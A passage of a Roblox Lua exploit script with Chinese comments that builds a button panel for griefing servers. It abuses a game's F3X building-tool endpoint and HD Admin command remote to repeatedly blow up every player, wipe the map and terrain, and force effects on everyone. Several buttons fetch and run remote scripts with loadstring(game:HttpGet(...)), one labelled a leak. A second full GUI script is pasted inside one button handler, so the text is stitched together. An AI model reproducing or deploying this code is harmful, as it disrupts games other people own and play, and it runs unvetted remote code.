            task.wait(0.1)
        end
    end)
    coroutine.resume(fullRotationThread)
    
    -- 同时使用HD管理员命令
    hdCommand(";rotate all 360")
end

-- 3. 全图爆炸
local explosionActive = false
local explosionThread

local function FullExplosion()
    if explosionActive then
        explosionActive = false
        if explosionThread then
            coroutine.close(explosionThread)
        end
        return
    end
    
    explosionActive = true
    explosionThread = coroutine.create(function()
        while explosionActive do
            -- 对每个玩家造成爆炸
            for _, plr in pairs(game.Players:GetPlayers()) do
                if plr.Character then
                    -- HD管理员爆炸命令
                    hdCommand(";explode " .. plr.Name)
                    
                    -- 创建F3X爆炸效果
                    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        for i = 1, 10 do
                            local explosion = Instance.new("Explosion")
                            explosion.Position = hrp.Position + Vector3.new(
                                math.random(-10, 10),
                                math.random(0, 5),
                                math.random(-10, 10)
                            )
                            explosion.BlastPressure = 500000
                            explosion.BlastRadius = 15
                            explosion.Parent = workspace
                        end
                    end
                end
            end
            
            -- 全图随机爆炸
            for i = 1, 20 do
                local randomPos = Vector3.new(
                    math.random(-200, 200),
                    math.random(0, 50),
                    math.random(-200, 200)
                )
                
                local explosion = Instance.new("Explosion")
                explosion.Position = randomPos
                explosion.BlastPressure = 1000000
                explosion.BlastRadius = 25
                explosion.Parent = workspace
                
                -- 使用F3X创建爆炸粒子
                runSync({"CreatePart", "Normal", CFrame.new(randomPos), workspace})
                task.wait(0.05)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Position == randomPos then
                        runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(255, 100, 0), UnionColoring = false}}})
                        runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Neon}}})
                        runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(10, 10, 10)}}})
                        break
                    end
                end
            end
            
            task.wait(1)
        end
    end)
    coroutine.resume(explosionThread)
end

-- 4. 下球雨
local ballRainActive = false
local ballRainThread
local ballRainBalls = {}

local function BallRain()
    if ballRainActive then
        ballRainActive = false
        if ballRainThread then
            coroutine.close(ballRainThread)
        end
        
        -- 清理所有球
        for _, ball in pairs(ballRainBalls) do
            if ball and ball.Parent then
                ball:Destroy()
            end
        end
        ballRainBalls = {}
        return
    end
    
    ballRainActive = true
    ballRainThread = coroutine.create(function()
        while ballRainActive do
            -- 在不同位置生成球
            for i = 1, 30 do
                local x = math.random(-300, 300)
                local y = math.random(100, 300)
                local z = math.random(-300, 300)
                
                local size = math.random(5, 20)
                local color = Color3.fromRGB(
                    math.random(0, 255),
                    math.random(0, 255),
                    math.random(0, 255)
                )
                
                -- 使用F3X创建球
                runSync({"CreatePart", "Normal", CFrame.new(x, y, z), workspace})
                task.wait(0.01)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Position.X == x and v.Position.Z == z then
                        runSync({"SetName", {v}, "BallRain"})
                        runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(size, size, size)}}})
                        runSync({"CreateMeshes", {{["Part"] = v}}})
                        runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://9982590"}}}) -- 球体网格
                        runSync({"SyncColor", {{Part = v, Color = color, UnionColoring = false}}})
                        runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Neon}}})
                        runSync({"SyncCollision", {{Part = v, CanCollide = false}}}) -- 穿透效果
                        
                        -- 添加向下力
                        local bodyForce = Instance.new("BodyForce")
                        bodyForce.Force = Vector3.new(0, -v:GetMass() * workspace.Gravity * 3, 0)
                        bodyForce.Parent = v
                        
                        table.insert(ballRainBalls, v)
                        
                        -- 5秒后自动清理
                        task.delay(5, function()
                            if v and v.Parent then
                                v:Destroy()
                            end
                        end)
                        
                        break
                    end
                end
            end
            
            task.wait(0.5)
        end
    end)
    coroutine.resume(ballRainThread)
end

-- 5. 全图生成NPC
local npcActive = false
local npcThread
local npcList = {}

local function SpawnNPCs()
    if npcActive then
        npcActive = false
        if npcThread then
            coroutine.close(npcThread)
        end
        
        -- 清理所有NPC
        for _, npc in pairs(npcList) do
            if npc and npc.Parent then
                npc:Destroy()
            end
        end
        npcList = {}
        return
    end
    
    npcActive = true
    npcThread = coroutine.create(function()
        while npcActive do
            -- 在不同位置生成NPC
            for i = 1, 10 do
                local x = math.random(-200, 200)
                local z = math.random(-200, 200)
                
                -- 使用HD管理员生成NPC
                hdCommand(";clone 156744778") -- 使用一个常见的NPC模型ID
                hdCommand(";tp NPC_" .. i .. " " .. x .. " 5 " .. z)
                
                -- 使用F3X创建NPC底座
                runSync({"CreatePart", "Normal", CFrame.new(x, 0, z), workspace})
                task.wait(0.05)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Position.X == x and v.Position.Z == z then
                        runSync({"SetName", {v}, "NPC_Stand_" .. i})
                        runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(5, 1, 5)}}})
                        runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(100, 100, 100), UnionColoring = false}}})
                        runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Concrete}}})
                        break
                    end
                end
            end
            
            task.wait(3)
        end
    end)
    coroutine.resume(npcThread)
end

-- 6. sunkun领域
local sunkunRealmActive = false

local function SunkunRealm()
    if sunkunRealmActive then
        sunkunRealmActive = false
        return
    end
    
    sunkunRealmActive = true
    
    -- 清除全图
    hdCommand(";clear all")
    hdCommand(";removeterrain")
    
    -- 等待清理完成
    task.wait(2)
    
    -- 运行一些指令设置环境
    hdCommand(";time 0")
    hdCommand(";fogcolor 100 50 0")
    hdCommand(";fogend 500")
    hdCommand(";ambient 255 200 150")
    hdCommand(";music 103409297553965")
    hdCommand(";volume inf")
    
    -- 创建地面
    runSync({"CreatePart", "Normal", CFrame.new(0, 0, 0), workspace})
    task.wait(0.1)
    
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Position == Vector3.new(0, 0, 0) then
            runSync({"SetName", {v}, "Realm_Ground"})
            runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(500, 5, 500)}}})
            runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(50, 25, 0), UnionColoring = false}}})
            runSync({"CreateTextures", {{["Part"] = v, ["Face"] = Enum.NormalId.Top, ["TextureType"] = "Texture"}}})
            runSync({"SyncTexture", {{
                ["Part"] = v, 
                ["Face"] = Enum.NormalId.Top,
                ["TextureType"] = "Texture",
                ["Texture"] = "rbxassetid://55420352", -- 木地板纹理
                ["StudsPerTileU"] = 10,
                ["StudsPerTileV"] = 10
            }}})
            break
        end
    end
    
    -- 创建高大房子建筑
    task.wait(0.5)
    
    -- 黑色框架
    for x = -40, 40, 80 do
        for z = -40, 40, 80 do
            runSync({"CreatePart", "Normal", CFrame.new(x, 25, z), workspace})
            task.wait(0.05)
            
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and v.Position.X == x and v.Position.Z == z then
                    runSync({"SetName", {v}, "Black_Frame"})
                    runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(5, 50, 5)}}})
                    runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(0, 0, 0), UnionColoring = false}}})
                    runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Neon}}})
                    break
                end
            end
        end
    end
    
    -- 连接框架的横梁
    for x = -35, 35, 70 do
        for y = 10, 40, 30 do
            for z = -35, 35, 70 do
                runSync({"CreatePart", "Normal", CFrame.new(x, y, z), workspace})
                task.wait(0.05)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Position.X == x and v.Position.Y == y and v.Position.Z == z then
                        runSync({"SetName", {v}, "Black_Beam"})
                        if x == -35 or x == 35 then
                            runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(70, 5, 5)}}})
                        else
                            runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(5, 5, 70)}}})
                        end
                        runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(0, 0, 0), UnionColoring = false}}})
                        runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Neon}}})
                        break
                    end
                end
            end
        end
    end
    
    -- 棕色大门
    task.wait(0.5)
    runSync({"CreatePart", "Normal", CFrame.new(0, 10, 40), workspace})
    task.wait(0.1)
    
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Position == Vector3.new(0, 10, 40) then
            runSync({"SetName", {v}, "Brown_Door"})
            runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(20, 30, 2)}}})
            runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(101, 67, 33), UnionColoring = false}}})
            runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Wood}}})
            
            -- 门把手
            runSync({"CreatePart", "Normal", CFrame.new(8, 10, 41), workspace})
            task.wait(0.05)
            
            for _, v2 in pairs(workspace:GetDescendants()) do
                if v2:IsA("BasePart") and v2.Position == Vector3.new(8, 10, 41) then
                    runSync({"SetName", {v2}, "Door_Handle"})
                    runSync({"SyncResize", {{Part = v2, CFrame = v2.CFrame, Size = Vector3.new(1, 3, 1)}}})
                    runSync({"SyncColor", {{Part = v2, Color = Color3.fromRGB(200, 200, 200), UnionColoring = false}}})
                    runSync({"SyncMaterial", {{Part = v2, Material = Enum.Material.Metal}}})
                    runSync({"CreateMeshes", {{["Part"] = v2}}})
                    runSync({"SyncMesh", {{["Part"] = v2, ["MeshId"] = "rbxassetid://12221677"}}}) -- 圆柱体网格
                    break
                end
            end
            break
        end
    end
    
    -- 红色纹路地毯
    task.wait(0.5)
    for x = -30, 30, 10 do
        runSync({"CreatePart", "Normal", CFrame.new(x, 0.1, 0), workspace})
        task.wait(0.05)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Position.X == x and v.Position.Y == 0.1 and v.Position.Z == 0 then
                runSync({"SetName", {v}, "Red_Carpet"})
                runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(8, 0.2, 60)}}})
                runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(200, 0, 0), UnionColoring = false}}})
                runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Fabric}}})
                
                -- 添加金色纹路
                runSync({"CreateTextures", {{["Part"] = v, ["Face"] = Enum.NormalId.Top, ["TextureType"] = "Decal"}}})
                runSync({"SyncTexture", {{
                    ["Part"] = v, 
                    ["Face"] = Enum.NormalId.Top,
                    ["TextureType"] = "Decal",
                    ["Texture"] = "rbxassetid://280362415", -- 金色纹路
                    ["StudsPerTileU"] = 5,
                    ["StudsPerTileV"] = 5
                }}})
                break
            end
        end
    end
    
    -- 宝座
    task.wait(0.5)
    runSync({"CreatePart", "Normal", CFrame.new(0, 5, -20), workspace})
    task.wait(0.1)
    
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Position == Vector3.new(0, 5, -20) then
            runSync({"SetName", {v}, "Throne_Base"})
            runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(15, 10, 15)}}})
            runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(200, 150, 0), UnionColoring = false}}})
            runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Metal}}})
            
            -- 宝座座位
            runSync({"CreatePart", "Normal", CFrame.new(0, 13, -20), workspace})
            task.wait(0.05)
            
            for _, v2 in pairs(workspace:GetDescendants()) do
                if v2:IsA("BasePart") and v2.Position == Vector3.new(0, 13, -20) then
                    runSync({"SetName", {v2}, "Throne_Seat"})
                    runSync({"SyncResize", {{Part = v2, CFrame = v2.CFrame, Size = Vector3.new(12, 2, 12)}}})
                    runSync({"SyncColor", {{Part = v2, Color = Color3.fromRGB(255, 215, 0), UnionColoring = false}}})
                    runSync({"SyncMaterial", {{Part = v2, Material = Enum.Material.Neon}}})
                    break
                end
            end
            
            -- 宝座靠背
            runSync({"CreatePart", "Normal", CFrame.new(0, 18, -25), workspace})
            task.wait(0.05)
            
            for _, v2 in pairs(workspace:GetDescendants()) do
                if v2:IsA("BasePart") and v2.Position == Vector3.new(0, 18, -25) then
                    runSync({"SetName", {v2}, "Throne_Back"})
                    runSync({"SyncResize", {{Part = v2, CFrame = v2.CFrame, Size = Vector3.new(12, 10, 2)}}})
                    runSync({"SyncColor", {{Part = v2, Color = Color3.fromRGB(255, 215, 0), UnionColoring = false}}})
                    runSync({"SyncMaterial", {{Part = v2, Material = Enum.Material.Neon}}})
                    
                    -- 添加皇冠装饰
                    runSync({"CreateMeshes", {{["Part"] = v2}}})
                    runSync({"SyncMesh", {{["Part"] = v2, ["MeshId"] = "rbxassetid://10970208924"}}}) -- 皇冠网格
                    runSync({"SyncMesh", {{["Part"] = v2, ["Scale"] = Vector3.new(2, 2, 2)}}})
                    break
                end
            end
            break
        end
    end
    
    -- 左边的NPC
    task.wait(0.5)
    hdCommand(";clone 156744778")
    hdCommand(";tp NPC_Guard -15 5 -20")
    hdCommand(";size NPC_Guard 1.5")
    hdCommand(";color NPC_Guard 0 0 255")
    
    -- 设置重生点
    hdCommand(";setspawn all 0 5 0")
    
    -- 添加照明
    for x = -30, 30, 20 do
        for z = -30, 30, 20 do
            runSync({"CreatePart", "Normal", CFrame.new(x, 40, z), workspace})
            task.wait(0.05)
            
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and v.Position.X == x and v.Position.Y == 40 and v.Position.Z == z then
                    runSync({"SetName", {v}, "Light_Pillar"})
                    runSync({"SyncResize", {{Part = v, CFrame = v.CFrame, Size = Vector3.new(2, 40, 2)}}})
                    runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(255, 255, 200), UnionColoring = false}}})
                    runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Neon}}})
                    
                    -- 添加点光源
                    local pointLight = Instance.new("PointLight")
                    pointLight.Color = Color3.fromRGB(255, 255, 200)
                    pointLight.Brightness = 10
                    pointLight.Range = 50
                    pointLight.Parent = v
                    break
                end
            end
        end
    end
    
    -- 添加漂浮文本
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and (v.Name == "Throne_Base" or v.Name == "Brown_Door") then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "SunKun_Realm_Text"
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.AlwaysOnTop = true
            billboard.StudsOffset = Vector3.new(0, 5, 0)
            billboard.Parent = v
            
            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Text = "SUNKUN领域"
            textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
            textLabel.TextScaled = true
            textLabel.Font = Enum.Font.GothamBlack
            textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            textLabel.TextStrokeTransparency = 0
            textLabel.Parent = billboard
        end
    end
    
    -- 运行更多指令
    task.wait(1)
    hdCommand(";respawn all")
    hdCommand(";ff all")
    hdCommand(";walkspeed all 50")
    hdCommand(";jumppower all 100")
    hdCommand(";h all")
    hdCommand(";god all")
    hdCommand(";btools all")
    hdCommand(";createteam SunKun 255 215 0")
    hdCommand(";team SunKun all")
    hdCommand(";serverMessage 欢迎来到SUNKUN领域！")
    
    sunkunRealmActive = false
end

-- ========== 标签页切换功能 ==========
tabF3X.MouseButton1Click:Connect(function()
    scrollFrame.Visible = true
    clientScroll.Visible = false
    newScroll.Visible = false
end)

tabClient.MouseButton1Click:Connect(function()
    scrollFrame.Visible = false
    clientScroll.Visible = true
    newScroll.Visible = false
end)

tabNew.MouseButton1Click:Connect(function()
    scrollFrame.Visible = false
    clientScroll.Visible = false
    newScroll.Visible = true
end)

-- ========== 创建F3X+HD功能区按钮 ==========
-- 原有功能...
makeBtn(scrollFrame, "Hint", "提示").MouseButton1Click:Connect(function()
    hdCommand(";serverhint  v1 已激活")
end)

makeBtn(scrollFrame, "Sky1", "天空盒1").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("106928937966054")
end)

makeBtn(scrollFrame, "Sky2", "天空盒2").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("110742039540962")
end)

makeBtn(scrollFrame, "Sky3", "天空盒3").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("82669030332975")
end)

makeBtn(scrollFrame, "Sky4", "天空盒4").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("75488066284824")
end)

makeBtn(scrollFrame, "Sky5", "天空盒5").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("130773707612358")
end)

makeBtn(scrollFrame, "Slap", "拍打塔").MouseButton1Click:Connect(function()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-f3x-slap-tower-map-75717"))()
    end)
    if not success then
        warn("加载拍打塔脚本失败: " .. tostring(result))
    end
end)

makeBtn(scrollFrame, "Meep", "Meep城市").MouseButton1Click:Connect(function()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-f3x-meepcity-map-75714"))()
    end)
    if not success then
        warn("加载Meep城市脚本失败: " .. tostring(result))
    end
end)

makeBtn(scrollFrame, "Z00", "Z00kiddl").MouseButton1Click:Connect(function()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-z00kiddl-f3x-gui-leak-by-mango-and-koopusers-68979"))()
    end)
    if not success then
        warn("加载Z00kiddl脚本失败: " .. tostring(result))
    end
end)

makeBtn(scrollFrame, "Disco", "迪斯科").MouseButton1Click:Connect(function()
    hdCommand(";disco")
end)

makeBtn(scrollFrame, "k00pkidd giu", "k00pkidd giu").MouseButton1Click:Connect(function()
    -- kidd 纯黑UI - F3X+HD管理员脚本
-- 版本：修复版 - 纯黑色UI，绿色框架边缘

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "k00pkidd_Black_UI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

-- 主框架
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 650, 0, 800)
mainFrame.Position = UDim2.new(0.5, -325, 0.5, -400)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
mainFrame.Parent = screenGui

local fc = Instance.new("UICorner")
fc.CornerRadius = UDim.new(0, 15)
fc.Parent = mainFrame

-- 背景图片
local bgImage = Instance.new("ImageLabel")
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.BackgroundTransparency = 1
bgImage.Image = "rbxassetid://130408055048563"
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.Parent = mainFrame

-- 标题 - 修复字体错误
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "k00pkidd UI"
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
title.ZIndex = 3
title.Parent = mainFrame

-- HD和F3X文字
local hdText = Instance.new("TextLabel")
hdText.Size = UDim2.new(0, 100, 0, 40)
hdText.Position = UDim2.new(0.3, 0, 0.1, 0)
hdText.BackgroundTransparency = 1
hdText.Text = "HD"
hdText.TextColor3 = Color3.fromRGB(0, 255, 0)
hdText.TextScaled = true
hdText.Font = Enum.Font.GothamBlack
hdText.TextStrokeTransparency = 0
hdText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
hdText.ZIndex = 3
hdText.Parent = mainFrame

local f3xText = Instance.new("TextLabel")
f3xText.Size = UDim2.new(0, 100, 0, 40)
f3xText.Position = UDim2.new(0.6, 0, 0.1, 0)
f3xText.BackgroundTransparency = 1
f3xText.Text = "F3X"
f3xText.TextColor3 = Color3.fromRGB(0, 255, 0)
f3xText.TextScaled = true
f3xText.Font = Enum.Font.GothamBlack
f3xText.TextStrokeTransparency = 0
f3xText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
f3xText.ZIndex = 3
f3xText.Parent = mainFrame

-- 滚动框架
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -40, 1, -140)
scrollFrame.Position = UDim2.new(0, 20, 0, 100)
scrollFrame.BackgroundTransparency = 0.8
scrollFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scrollFrame.BorderSizePixel = 2
scrollFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 2000)
scrollFrame.ScrollBarThickness = 8
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 0)
scrollFrame.Parent = mainFrame

local scrollCorner = Instance.new("UICorner")
scrollCorner.CornerRadius = UDim.new(0, 10)
scrollCorner.Parent = scrollFrame

-- UI网格布局
local uiGrid = Instance.new("UIGridLayout")
uiGrid.CellSize = UDim2.new(0, 180, 0, 45)
uiGrid.CellPadding = UDim2.new(0, 10, 0, 10)
uiGrid.StartCorner = Enum.StartCorner.TopLeft
uiGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
uiGrid.Parent = scrollFrame

-- HD管理员命令函数
local function hdCommand(cmdStr)
    local rs = game:GetService("ReplicatedStorage")
    if rs:FindFirstChild("HDAdminHDClient") and rs.HDAdminHDClient.Signals:FindFirstChild("RequestCommandSilent") then
        rs.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(cmdStr)
    end
end

-- F3X工具获取函数
local function getSyncTool()
    local tool
    for _, v in pairs(player:GetDescendants()) do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
    if not tool then
        for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
            if v.Name == "SyncAPI" then
                tool = v.Parent
                break
            end
        end
    end
    return tool
end

local function runSync(args)
    local tool = getSyncTool()
    if tool and tool.SyncAPI and tool.SyncAPI.ServerEndpoint then
        tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
    end
end

-- 通用按钮创建函数
local function makeBtn(parent, name, text)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Text = text
    btn.Size = UDim2.new(0, 180, 0, 45)
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.BorderSizePixel = 2
    btn.BorderColor3 = Color3.fromRGB(0, 255, 0)
    btn.TextColor3 = Color3.fromRGB(0, 255, 0)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    return btn
end

-- 恢复功能
local function RestoreAll()
    -- 恢复所有HD管理员设置
    hdCommand(";normal all")
    hdCommand(";char all normal")
    hdCommand(";disco off")
    hdCommand(";blur all 0")
    hdCommand(";fog off")
    hdCommand(";fov all 70")
    hdCommand(";time 12")
    hdCommand(";brightness 1")
    hdCommand(";gravity 196.2")
    hdCommand(";music off")
    hdCommand(";volume 1")
    hdCommand(";removetitles all")
    hdCommand(";removefire all")
    
    -- 恢复所有F3X效果
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "Terrain" then
            pcall(function()
                v.Anchored = false
                runSync({"SyncAnchor", {{Part = v, Anchored = false}}})
                runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(255, 255, 255), UnionColoring = false}}})
                runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Plastic}}})
            end)
        end
    end
    
    -- 清理所有漂浮文本和图片
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BillboardGui") or obj.Name == "Floating_Image" then
            obj:Destroy()
        end
    end
    
    hdCommand(";serverMessage ¡Restauración completa! (恢复完成!)")
end

-- ========== 功能按钮创建 ==========

-- 1-4. 贴图功能
makeBtn(scrollFrame, "Decal1", "贴图1").MouseButton1Click:Connect(function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            task.spawn(function()
                runSync({"SetLocked", {v}, false})
